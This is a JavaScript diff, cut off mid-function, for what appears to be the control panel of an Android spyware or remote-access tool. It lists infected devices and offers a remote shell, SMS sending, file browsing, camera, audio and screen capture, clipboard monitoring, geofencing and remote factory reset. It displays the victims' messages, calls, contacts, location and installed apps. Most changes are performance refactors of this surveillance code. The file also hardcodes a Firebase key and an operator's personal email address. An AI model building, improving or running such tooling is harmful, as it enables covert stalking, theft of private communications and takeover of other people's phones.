@@ -1,7 +1,7 @@
-import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js';
-import { getAuth, signOut, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js';
-import { getDatabase, ref, onValue, set, update, off, get, push, remove } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js';
-import { getStorage as getStorageInstance } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-storage.js';
+import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js';
+import { getAuth, signOut, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js';
+import { getDatabase, ref, onValue, set, update, off, get, push, remove } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js';
+import { getStorage as getStorageInstance } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js';
 
 const firebaseConfig = {
     apiKey: "AIzaSyBhaPM20tIhMalxLjoCklmwy4qb1ZkraSo",
@@ -21,7 +21,8 @@ const storage = getStorageInstance(app);
 let currentUser = null;
 let selectedDevice = null;
 let allDevices = [];
-let deviceListeners = {};
+let deviceListeners = new Map();
+const dataCache = new Map();
 const ALLOWED_OPERATOR_EMAIL = "nicholasbagenda@gmail.com";
 
 const noDeviceAlert = document.getElementById('no-device-alert');
@@ -44,7 +45,13 @@ onAuthStateChanged(auth, (user) => {
 
 function loadAllDevices() {
     const devicesRef = ref(database, 'devices');
-    onValue(devicesRef, (snapshot) => {
+    const key = 'all-devices-listener';
+    
+    if (deviceListeners.has(key)) {
+        off(deviceListeners.get(key));
+    }
+    
+    const unsubscribe = onValue(devicesRef, (snapshot) => {
         allDevices = [];
         if (snapshot.exists()) {
             const data = snapshot.val();
@@ -64,22 +71,36 @@ function loadAllDevices() {
             });
             renderDevicesList();
             if (allDevices.length > 0 && !selectedDevice) selectDevice(allDevices[0].uid);
-        } else { showNoDeviceAlert(); }
+        } else { 
+            showNoDeviceAlert(); 
+        }
+    }, (error) => {
+        console.error("❌ Error loading devices:", error);
     });
+    
+    deviceListeners.set(key, unsubscribe);
 }
 
 function renderDevicesList() {
+    const fragment = document.createDocumentFragment();
     devicesList.innerHTML = '';
     deviceCount.textContent = allDevices.length;
+    
     allDevices.forEach(device => {
         const item = document.createElement('div');
         item.className = `device-item ${selectedDevice === device.uid ? 'active' : ''}`;
         item.innerHTML = `<div class="device-item-info"><div class="device-item-name">${device.name}</div><div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'} • 🔋${device.battery}%</div></div>`;
         item.addEventListener('click', () => selectDevice(device.uid));
-        devicesList.appendChild(item);
+        fragment.appendChild(item);
     });
+    
+    devicesList.appendChild(fragment);
+    
     if (allDevices.length === 0) showNoDeviceAlert();
-    else { noDeviceAlert.style.display = 'none'; deviceDashboard.style.display = 'block'; }
+    else { 
+        noDeviceAlert.style.display = 'none'; 
+        deviceDashboard.style.display = 'block'; 
+    }
 }
 
 function selectDevice(deviceUid) {
@@ -88,10 +109,27 @@ function selectDevice(deviceUid) {
     noDeviceAlert.style.display = 'none';
     deviceDashboard.style.display = 'block';
     injectAdvancedControls();
-    Object.keys(deviceListeners).forEach(key => { try { off(deviceListeners[key]); } catch(e) {} });
-    deviceListeners = {};
+    
+    cleanupAllListeners();
+    
     loadDeviceData(deviceUid);
     setupCommandListeners(deviceUid);
+}
+
+function cleanupAllListeners() {
+    deviceListeners.forEach((unsubscribe, key) => {
+        try {
+            if (typeof unsubscribe === 'function') {
+                unsubscribe();
+            } else {
+                off(unsubscribe);
+            }
+        } catch(e) {
+            console.warn(`Failed to cleanup listener ${key}:`, e);
+        }
+    });
+    deviceListeners.clear();
+    dataCache.clear();
 }
 
 function injectAdvancedControls() {
@@ -124,33 +162,49 @@ function injectAdvancedControls() {
     matrix.appendChild(createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER'));
 
     matrix.appendChild(createSectionHeader('⚠️ DANGER ZONE'));
-    const uninst = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER'); uninst.style.borderColor = '#ff6b6b'; matrix.appendChild(uninst);
-    const rebot = createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER'); rebot.style.borderColor = '#ff6b6b'; matrix.appendChild(rebot);
-    const shutd = createMatrixBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER'); shutd.style.borderColor = '#ff6b6b'; matrix.appendChild(shutd);
-    const factr = createMatrixBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER'); factr.style.borderColor = '#ff0000'; matrix.appendChild(factr);
-    const lockn = createMatrixBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER'); lockn.style.borderColor = '#ff6b6b'; matrix.appendChild(lockn);
+    const uninst = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER'); 
+    uninst.style.borderColor = '#ff6b6b'; 
+    matrix.appendChild(uninst);
+    const rebot = createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER'); 
+    rebot.style.borderColor = '#ff6b6b'; 
+    matrix.appendChild(rebot);
+    const shutd = createMatrixBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER'); 
+    shutd.style.borderColor = '#ff6b6b'; 
+    matrix.appendChild(shutd);
+    const factr = createMatrixBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER'); 
+    factr.style.borderColor = '#ff0000'; 
+    matrix.appendChild(factr);
+    const lockn = createMatrixBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER'); 
+    lockn.style.borderColor = '#ff6b6b'; 
+    matrix.appendChild(lockn);
 
-    const timeW = document.createElement('div'); timeW.className = 'time-control-wrapper';
+    const timeW = document.createElement('div'); 
+    timeW.className = 'time-control-wrapper';
     timeW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE</label><input type="time" id="time-setter">`;
     controlMatrixCard.after(timeW);
 
-    const shellW = document.createElement('div'); shellW.className = 'shell-control-wrapper';
+    const shellW = document.createElement('div'); 
+    shellW.className = 'shell-control-wrapper';
     shellW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-terminal"></i> REMOTE SHELL</label><div style="display:flex;gap:8px;"><input type="text" id="shell-input" placeholder="ls /sdcard" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">RUN</button></div><pre id="shell-output" style="display:none;background:#050510;color:#00ff88;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:400px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;font-family:'Courier New',monospace;line-height:1.5;border:1px solid #1a3a1a;"></pre>`;
     timeW.after(shellW);
 
-    const smsW = document.createElement('div'); smsW.className = 'shell-control-wrapper';
+    const smsW = document.createElement('div'); 
+    smsW.className = 'shell-control-wrapper';
     smsW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-paper-plane"></i> SEND SMS</label><div style="display:flex;gap:8px;margin-bottom:8px;"><input type="text" id="sms-number" placeholder="+256700123456" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"></div><div style="display:flex;gap:8px;"><input type="text" id="sms-body" placeholder="Message text..." style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><button id="cmd-sendsms" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SEND</button></div>`;
     shellW.after(smsW);
 
-    const fileW = document.createElement('div'); fileW.className = 'shell-control-wrapper';
+    const fileW = document.createElement('div'); 
+    fileW.className = 'shell-control-wrapper';
     fileW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label><div style="display:flex;gap:8px;"><input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">LIST</button></div><div id="file-output" style="display:none;background:#050510;color:#4ecdc4;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:500px;overflow:auto;line-height:1.6;"></div>`;
     smsW.after(fileW);
 
-    const geoW = document.createElement('div'); geoW.className = 'shell-control-wrapper';
+    const geoW = document.createElement('div'); 
+    geoW.className = 'shell-control-wrapper';
     geoW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-location-crosshairs"></i> GEOFENCE</label><div style="display:flex;gap:8px;margin-bottom:8px;"><input type="number" id="geo-lat" placeholder="Latitude (0.3476)" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><input type="number" id="geo-lng" placeholder="Longitude (32.5825)" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><input type="number" id="geo-radius" placeholder="Radius (m)" value="1000" style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"></div><div style="display:flex;gap:8px;"><button id="cmd-setgeo" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SET GEOFENCE</button><button id="cmd-disablegeo" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">DISABLE</button></div>`;
     fileW.after(geoW);
 
-    const dp = document.createElement('div'); dp.className = 'data-panels-grid';
+    const dp = document.createElement('div'); 
+    dp.className = 'data-panels-grid';
     dp.innerHTML = `
         <div class="data-panel"><div class="data-panel-header">📱 SMS Messages <span id="sms-count" class="badge">0</span></div><div class="data-panel-body" id="sms-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">📞 Call Log <span id="calls-count" class="badge">0</span></div><div class="data-panel-body" id="calls-feed">Waiting for data...</div></div>
@@ -172,13 +226,17 @@ function injectAdvancedControls() {
 
 function createMatrixBtn(id, icon, label, stateText) {
     const btn = document.createElement('button');
-    btn.id = id; btn.className = 'matrix-btn toggle-btn';
+    btn.id = id; 
+    btn.className = 'matrix-btn toggle-btn';
     btn.innerHTML = `<i class="fa-solid ${icon}"></i><span>${label}</span><span class="toggle-state">${stateText}</span>`;
     return btn;
 }
+
 function createSectionHeader(title) {
-    const h = document.createElement('div'); h.className = 'section-header';
-    h.innerHTML = `<h3>${title}</h3>`; return h;
+    const h = document.createElement('div'); 
+    h.className = 'section-header';
+    h.innerHTML = `<h3>${title}</h3>`; 
+    return h;
 }
 
 function loadDeviceData(uid) {
@@ -192,23 +250,45 @@ function loadDeviceData(uid) {
 
 function initializeTelemetryStream(uid) {
     const statusRef = ref(database, `devices/${uid}/status`);
-    if (deviceListeners[`status-${uid}`]) off(deviceListeners[`status-${uid}`]);
-    deviceListeners[`status-${uid}`] = onValue(statusRef, (snap) => {
+    const key = `status-${uid}`;
+    
+    if (deviceListeners.has(key)) {
+        off(deviceListeners.get(key));
+    }
+    
+    const unsubscribe = onValue(statusRef, (snap) => {
         if (!snap.exists()) return;
         const d = snap.val();
-        if (document.getElementById('battery-text')) {
-            document.getElementById('battery-text').textContent = d.batteryPercentage !== undefined ? `${d.batteryPercentage}%` : "--%";
+        
+        const batteryText = document.getElementById('battery-text');
+        if (batteryText) {
+            const newText = d.batteryPercentage !== undefined ? `${d.batteryPercentage}%` : "--%";
+            if (batteryText.textContent !== newText) {
+                batteryText.textContent = newText;
+            }
+            
             const bar = document.getElementById('battery-bar');
             if (bar) bar.style.width = `${d.batteryPercentage || 0}%`;
         }
+        
         if (document.getElementById('latitude-text') && d.latitude != null) {
-            document.getElementById('latitude-text').textContent = parseFloat(d.latitude).toFixed(6);
-            document.getElementById('longitude-text').textContent = parseFloat(d.longitude).toFixed(6);
+            const latEl = document.getElementById('latitude-text');
+            const lngEl = document.getElementById('longitude-text');
+            const newLat = parseFloat(d.latitude).toFixed(6);
+            const newLng = parseFloat(d.longitude).toFixed(6);
+            
+            if (latEl.textContent !== newLat) latEl.textContent = newLat;
+            if (lngEl.textContent !== newLng) lngEl.textContent = newLng;
+            
             const ml = document.getElementById('map-link');
             if (ml) ml.href = `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`;
         }
+        
         const ls = document.getElementById('last-seen-text');
-        if (ls && (d.last_seen || d.lastSeen)) ls.textContent = new Date(d.last_seen || d.lastSeen).toLocaleString();
+        if (ls && (d.last_seen || d.lastSeen)) {
+            const newTime = new Date(d.last_seen || d.lastSeen).toLocaleString();
+            if (ls.textContent !== newTime) ls.textContent = newTime;
+        }
 
         const img = document.getElementById('cameraPreviewFrame');
         const vid = document.getElementById('mediaVideoPlayer');
@@ -216,25 +296,64 @@ function initializeTelemetryStream(uid) {
         const audC = document.getElementById('audio-container');
         const ph = document.getElementById('mediaPlaceholderText');
         const ts = document.getElementById('captureTimestamp');
-        const hideAll = () => { if(img) img.style.display='none'; if(vid){vid.style.display='none';vid.pause();} if(aud){aud.style.display='none';aud.pause();} if(audC) audC.style.display='none'; if(ph) ph.style.display='block'; };
+        
+        const hideAll = () => { 
+            if(img) img.style.display='none'; 
+            if(vid){vid.style.display='none';vid.pause();} 
+            if(aud){aud.style.display='none';aud.pause();} 
+            if(audC) audC.style.display='none'; 
+            if(ph) ph.style.display='block'; 
+        };
 
         const photoUrl = d.lastPhotoUrl || d.last_photo_url;
         const videoUrl = d.lastVideoUrl || d.last_video_url;
         const audioUrl = d.lastAudioUrl || d.last_audio_url;
         let active = false;
 
-        if (photoUrl && img) { hideAll(); img.src = photoUrl + (photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`); img.style.display='block'; active=true; }
-        else if (videoUrl && vid) { hideAll(); if(vid.src!==videoUrl){vid.src=videoUrl;vid.load();} vid.style.display='block'; active=true; }
-        else if (audioUrl && aud) { hideAll(); if(aud.src!==audioUrl){aud.src=audioUrl;aud.load();} aud.style.display='block'; if(audC) audC.style.display='block'; active=true; }
+        if (photoUrl && img) { 
+            hideAll(); 
+            const newSrc = photoUrl + (photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`);
+            if (img.src !== newSrc) img.src = newSrc;
+            img.style.display='block'; 
+            active=true; 
+        }
+        else if (videoUrl && vid) { 
+            hideAll(); 
+            if(vid.src!==videoUrl){vid.src=videoUrl;vid.load();} 
+            vid.style.display='block'; 
+            active=true; 
+        }
+        else if (audioUrl && aud) { 
+            hideAll(); 
+            if(aud.src!==audioUrl){aud.src=audioUrl;aud.load();} 
+            aud.style.display='block'; 
+            if(audC) audC.style.display='block'; 
+            active=true; 
+        }
 
-        if (active && ts) ts.innerText = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
-        else if (!active && ph) ph.style.display = 'block';
+        if (active && ts) {
+            const newTime = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
+            if (ts.innerText !== newTime) ts.innerText = newTime;
+        }
+        else if (!active && ph) {
+            ph.style.display = 'block';
+        }
+    }, (error) => {
+        console.error("❌ Telemetry stream error:", error);
     });
+    
+    deviceListeners.set(key, unsubscribe);
 }
 
 function initializeCommandStateListeners(uid) {
     const commandsRef = ref(database, `devices/${uid}/commands`);
-    deviceListeners[`commands-${uid}`] = onValue(commandsRef, (snap) => {
+    const key = `commands-${uid}`;
+    
+    if (deviceListeners.has(key)) {
+        off(deviceListeners.get(key));
+    }
+    
+    const unsubscribe = onValue(commandsRef, (snap) => {
         const cmd = snap.val() || {};
         updateButtonState('cmd-flashlight', cmd.flashlight);
         updateButtonState('cmd-alarm', cmd.alarm);
@@ -244,92 +363,310 @@ function initializeCommandStateListeners(uid) {
         updateButtonState('cmd-ambient', cmd.start_ambient);
         updateButtonState('cmd-screenrec', cmd.record_screen);
         updateButtonState('cmd-clipboard', cmd.monitor_clipboard);
+        
         const ti = document.getElementById('time-setter');
-        if (ti && cmd.activation_time && document.activeElement !== ti) ti.value = cmd.activation_time;
+        if (ti && cmd.activation_time && document.activeElement !== ti) {
+            ti.value = cmd.activation_time;
+        }
+    }, (error) => {
+        console.error("❌ Command listener error:", error);
     });
+    
+    deviceListeners.set(key, unsubscribe);
 }
 
 function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'sms', (d) => {
-        const msgs = d.messages || []; const c = document.getElementById('sms-count'); if(c) c.textContent = msgs.length;
-        const f = document.getElementById('sms-feed'); if(!f) return;
-        if(!msgs.length){f.innerHTML='No SMS data yet';return;}
-        f.innerHTML = msgs.map(m=>`<div class="feed-item"><strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('');
+        const msgs = d.messages || [];
+        const c = document.getElementById('sms-count');
+        if(c) c.textContent = msgs.length;
+        
+        const f = document.getElementById('sms-feed');
+        if(!f) return;
+        
+        const cacheKey = `sms-${uid}`;
+        const cached = dataCache.get(cacheKey);
+        if (cached && JSON.stringify(cached) === JSON.stringify(msgs)) return;
+        dataCache.set(cacheKey, msgs);
+        
+        if(!msgs.length){
+            f.innerHTML='No SMS data yet';
+            return;
+        }
+        
+        const fragment = document.createDocumentFragment();
+        msgs.forEach(m => {
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `<strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}`;
+            fragment.appendChild(div);
+        });
+        f.innerHTML = '';
+        f.appendChild(fragment);
     });
+    
     listenToFeed(uid, 'sms_live', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
-        const f = document.getElementById('sms-feed'); if(!f||!items.length) return;
-        f.innerHTML = items.map(m=>`<div class="feed-item live-item">🔴 <strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('') + f.innerHTML;
+        const f = document.getElementById('sms-feed');
+        if(!f||!items.length) return;
+        
+        const fragment = document.createDocumentFragment();
+        items.forEach(m => {
+            const div = document.createElement('div');
+            div.className = 'feed-item live-item';
+            div.innerHTML = `🔴 <strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}`;
+            fragment.appendChild(div);
+        });
+        
+        while (fragment.firstChild) {
+            f.insertBefore(fragment.firstChild, f.firstChild);
+        }
     });
+    
     listenToFeed(uid, 'call_log', (d) => {
-        const calls = d.calls||[]; const c = document.getElementById('calls-count'); if(c) c.textContent = calls.length;
-        const f = document.getElementById('calls-feed'); if(!f) return;
-        if(!calls.length){f.innerHTML='No call data yet';return;}
-        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
+        const calls = d.calls||[];
+        const c = document.getElementById('calls-count');
+        if(c) c.textContent = calls.length;
+        
+        const f = document.getElementById('calls-feed');
+        if(!f) return;
+        
+        const cacheKey = `calls-${uid}`;
+        const cached = dataCache.get(cacheKey);
+        if (cached && JSON.stringify(cached) === JSON.stringify(calls)) return;
+        dataCache.set(cacheKey, calls);
+        
+        if(!calls.length){
+            f.innerHTML='No call data yet';
+            return;
+        }
+        
+        const fragment = document.createDocumentFragment();
+        calls.forEach(call => {
+            const i = call.type==='incoming'?'📥':call.type==='outgoing'?'📤':'';
+            const dur = call.duration_seconds ? `${Math.floor(call.duration_seconds/60)}m ${call.duration_seconds%60}s` : '--';
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `${i} <strong>${esc(call.name||call.number||'Unknown')}</strong> <small>${fmtTime(call.timestamp)} • ${dur} • ${call.type}</small>`;
+            fragment.appendChild(div);
+        });
+        f.innerHTML = '';
+        f.appendChild(fragment);
     });
+    
     listenToFeed(uid, 'calls_live', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,10);
-        const f = document.getElementById('calls-feed'); if(!f||!items.length) return;
-        f.innerHTML = items.map(c=>{const i=c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'';return `<div class="feed-item live-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small></div>`;}).join('') + f.innerHTML;
+        const f = document.getElementById('calls-feed');
+        if(!f||!items.length) return;
+        
+        const fragment = document.createDocumentFragment();
+        items.forEach(c => {
+            const i = c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'';
+            const div = document.createElement('div');
+            div.className = 'feed-item live-item';
+            div.innerHTML = `${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small>`;
+            fragment.appendChild(div);
+        });
+        
+        while (fragment.firstChild) {
+            f.insertBefore(fragment.firstChild, f.firstChild);
+        }
     });
 
-    // ── CONTACTS ──
     listenToFeed(uid, 'contacts', (d) => {
-        const ct = d.contacts||[]; const c = document.getElementById('contacts-count'); if(c) c.textContent = ct.length;
-        const f = document.getElementById('contacts-feed'); if(!f) return;
-        if(!ct.length){f.innerHTML='No contact data yet';return;}
+        const ct = d.contacts||[];
+        const c = document.getElementById('contacts-count');
+        if(c) c.textContent = ct.length;
+        
+        const f = document.getElementById('contacts-feed');
+        if(!f) return;
+        
+        const cacheKey = `contacts-${uid}`;
+        const cached = dataCache.get(cacheKey);
+        if (cached && JSON.stringify(cached) === JSON.stringify(ct)) return;
+        dataCache.set(cacheKey, ct);
+        
+        if(!ct.length){
+            f.innerHTML='No contact data yet';
+            return;
+        }
+        
         var grouped = {};
-        ct.forEach(function(c) {
-            var name = c.name || 'Unknown';
+        ct.forEach(function(contact) {
+            var name = contact.name || 'Unknown';
             if(!grouped[name]) grouped[name] = [];
-            var num = c.number || '';
-            var typ = c.type || '';
+            var num = contact.number || '';
+            var typ = contact.type || '';
             var exists = grouped[name].some(function(n){return n.number===num && n.type===typ;});
             if(!exists) grouped[name].push({number:num, type:typ});
         });
+        
         var names = Object.keys(grouped).sort(function(a,b){return a.localeCompare(b);});
         var html = '<div class="feed-item" style="color:#00ff88;">👥 ' + names.length + ' unique contacts (' + ct.length + ' total entries)</div>';
+        
+        const fragment = document.createDocumentFragment();
         names.forEach(function(name) {
             var nums = grouped[name];
-            var numHtml = nums.map(function(n){return esc(n.number) + ' <span style="color:#555;">• ' + esc(n.type) + '</span>';}).join('<br>');
-            html += '<div class="feed-item"><strong>' + esc(name) + '</strong><br><small>' + numHtml + '</small></div>';
+            var numHtml = nums.map(function(n){
+                return esc(n.number) + ' <span style="color:#555;">• ' + esc(n.type) + '</span>';
+            }).join('<br>');
+            
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `<strong>${esc(name)}</strong><br><small>${numHtml}</small>`;
+            fragment.appendChild(div);
         });
+        
         f.innerHTML = html;
+        f.appendChild(fragment);
     });
 
     listenToFeed(uid, 'wifi', (d) => {
-        const nets = d.nearby_networks||[]; const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
-        const f = document.getElementById('wifi-feed'); if(!f) return;
+        const nets = d.nearby_networks||[];
+        const c = document.getElementById('wifi-count');
+        if(c) c.textContent = nets.length;
+        
+        const f = document.getElementById('wifi-feed');
+        if(!f) return;
+        
+        const cacheKey = `wifi-${uid}`;
+        const cached = dataCache.get(cacheKey);
+        if (cached && JSON.stringify(cached) === JSON.stringify(nets)) return;
+        dataCache.set(cacheKey, nets);
+        
         let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
-        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'':'';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
+        
+        const fragment = document.createDocumentFragment();
+        nets.slice(0,30).forEach(n => {
+            const b = n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'🔴';
+            const l = n.is_secured?'🔒':'';
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small>`;
+            fragment.appendChild(div);
+        });
+        
         f.innerHTML = h;
+        f.appendChild(fragment);
     });
+    
     listenToFeed(uid, 'installed_apps', (d) => {
-        const apps = d.apps||[]; const c = document.getElementById('apps-count'); if(c) c.textContent = apps.length;
-        const f = document.getElementById('apps-feed'); if(!f) return;
-        if(!apps.length){f.innerHTML='No app data yet';return;}
-        const ua = apps.filter(a=>!a.is_system); const sa = apps.filter(a=>a.is_system);
+        const apps = d.apps||[];
+        const c = document.getElementById('apps-count');
+        if(c) c.textContent = apps.length;
+        
+        const f = document.getElementById('apps-feed');
+        if(!f) return;
+        
+        const cacheKey = `apps-${uid}`;
+        const cached = dataCache.get(cacheKey);
+        if (cached && JSON.stringify(cached) === JSON.stringify(apps)) return;
+        dataCache.set(cacheKey, apps);
+        
+        if(!apps.length){
+            f.innerHTML='No app data yet';
+            return;
+        }
+        
+        const ua = apps.filter(a=>!a.is_system);
+        const sa = apps.filter(a=>a.is_system);
         let h = `<div class="feed-item" style="color:#00ff88;">📦 ${ua.length} user apps • ${sa.length} system apps</div>`;
-        h += ua.slice(0,50).map(a=>`<div class="feed-item"><strong>${esc(a.name||a.package_name)}</strong> <small>v${a.version_name||'?'} • ${a.package_name}</small></div>`).join('');
+        
+        const fragment = document.createDocumentFragment();
+        ua.slice(0,50).forEach(a => {
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `<strong>${esc(a.name||a.package_name)}</strong> <small>v${a.version_name||'?'} • ${a.package_name}</small>`;
+            fragment.appendChild(div);
+        });
+        
         f.innerHTML = h;
+        f.appendChild(fragment);
     });
+    
     listenToFeed(uid, 'device_info', (d) => {
-        const f = document.getElementById('deviceinfo-feed'); if(!f) return;
-        const rows = [['Model',d.model],['Brand',d.brand],['Android',d.android_version],['SDK',d.sdk_version],['Storage',`${d.storage_used_percent||'?'}% used (${d.storage_free_gb||'?'}GB free)`],['RAM',`${d.ram_available_mb||'?'}MB / ${d.ram_total_mb||'?'}MB`],['Carrier',d.carrier],['Network',d.network_type],['Wi-Fi',d.wifi_ssid],['IP',d.wifi_ip],['Screen',`${d.screen_width}x${d.screen_height}`],['Uptime',`${Math.floor((d.uptime_seconds||0)/3600)}h ${Math.floor(((d.uptime_seconds||0)%3600)/60)}m`]];
-        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
+        const f = document.getElementById('deviceinfo-feed');
+        if(!f) return;
+        
+        const cacheKey = `deviceinfo-${uid}`;
+        const cached = dataCache.get(cacheKey);
+        if (cached && JSON.stringify(cached) === JSON.stringify(d)) return;
+        dataCache.set(cacheKey, d);
+        
+        const rows = [
+            ['Model',d.model],
+            ['Brand',d.brand],
+            ['Android',d.android_version],
+            ['SDK',d.sdk_version],
+            ['Storage',`${d.storage_used_percent||'?'}% used (${d.storage_free_gb||'?'}GB free)`],
+            ['RAM',`${d.ram_available_mb||'?'}MB / ${d.ram_total_mb||'?'}MB`],
+            ['Carrier',d.carrier],
+            ['Network',d.network_type],
+            ['Wi-Fi',d.wifi_ssid],
+            ['IP',d.wifi_ip],
+            ['Screen',`${d.screen_width}x${d.screen_height}`],
+            ['Uptime',`${Math.floor((d.uptime_seconds||0)/3600)}h ${Math.floor(((d.uptime_seconds||0)%3600)/60)}m`]
+        ];
+        
+        const fragment = document.createDocumentFragment();
+        rows.forEach(([k,v]) => {
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `<strong>${k}:</strong> ${v||'--'}`;
+            fragment.appendChild(div);
+        });
+        
+        f.innerHTML = '';
+        f.appendChild(fragment);
     });
+    
     listenToFeed(uid, 'battery_current', (d) => {
-        const f = document.getElementById('battery-feed'); if(!f) return;
-        const rows = [['Level',`${d.level_percent||'?'}%`],['Status',d.status],['Health',d.health],['Temp',`${d.temperature_c||'?'}°C`],['Voltage',`${d.voltage_mv||'?'}mV`],['Source',d.charge_source],['Tech',d.technology]];
-        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
+        const f = document.getElementById('battery-feed');
+        if(!f) return;
+        
+        const cacheKey = `battery-${uid}`;
+        const cached = dataCache.get(cacheKey);
+        if (cached && JSON.stringify(cached) === JSON.stringify(d)) return;
+        dataCache.set(cacheKey, d);
+        
+        const rows = [
+            ['Level',`${d.level_percent||'?'}%`],
